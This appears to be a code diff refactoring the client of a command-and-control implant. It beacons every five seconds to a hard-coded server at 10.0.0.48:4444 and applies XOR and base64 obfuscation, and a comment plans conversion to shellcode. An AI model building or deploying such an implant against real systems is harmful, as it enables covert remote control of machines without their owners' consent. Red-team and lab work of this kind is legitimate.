@@ -7,25 +7,57 @@
 
 // TODO: eventually convert to c code then asm then shell code?
 
-//#include "stager.h"
-
 
 #include "Client.h"
+#include "ComponentFactory.h"
+#include "TransportLayer.h"
+
+#include <iostream>
 
 
 
-
-
-Client::Client() : 
-	transporter_(messageHandler_, "10.0.0.48", "4444") // Default server address
+Client::Client() :
+	messageHandler_(),
+	transportLayerPtr_(
+		TransportLayerFactory::create(
+		messageHandler_,
+		"10.0.0.48",
+		"4444",
+		TransportLayerType::TCP,
+		SerializerType::BINARY,
+		EncoderType::BASE64,
+		EncryptorType::XOR
+		)
+	)
 {
-	messageHandler_.setTransporter(transporter_);
+	messageHandler_.setTransportLayer(*transportLayerPtr_);
 }
 
-Client::Client(TCPTransporter transporter, std::string server, std::string port) : // TODO: transporter parameter isn't used 
-	transporter_(messageHandler_, server, port)
+Client::Client(
+	const std::string& server,
+	const std::string& port,
+	TransportLayerType transportType,
+	SerializerType serializerType,
+	EncoderType encoderType,
+	EncryptorType encryptorType)
+	:
+	messageHandler_(),
+	transportLayerPtr_(
+		TransportLayerFactory::create(
+			messageHandler_,
+			server,
+			port,
+			transportType,
+			serializerType,
+			encoderType,
+			encryptorType)
+	)
 {
-	messageHandler_.setTransporter(transporter_);
+	messageHandler_.setTransportLayer(*transportLayerPtr_);
+}
+
+Client::~Client()
+{
 }
 
 bool Client::run()
@@ -46,17 +78,30 @@ bool Client::run()
 
 	*/
 
-
-	while (true)
+	__try
 	{
-		if (!transporter_.isConnected())
+		while (true)
 		{
-			transporter_.connect();    // Try to connect (handles if already connected)
+			if (!transportLayerPtr_->isConnected())
+			{
+				transportLayerPtr_->connect();
+			}
+
+			if (transportLayerPtr_->isConnected())
+			{
+				transportLayerPtr_->beacon();
+			}
+			std::cout << "before sleeping" << std::endl;
+			Sleep(5000);
+			std::cout << "after sleeping" << std::endl;
 		}
-		transporter_.beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
-		//transporter_.receive();
-		//transporter_.sendMessage();
-		Sleep(5000);            // Wait 1 minute
 	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		std::cout << "CRITICAL: Exception in main loop: 0x" << std::hex << GetExceptionCode() << std::dec << std::endl;
+		// Try to reconnect or restart
+		return false;
+	}
+
 	return false;
 }
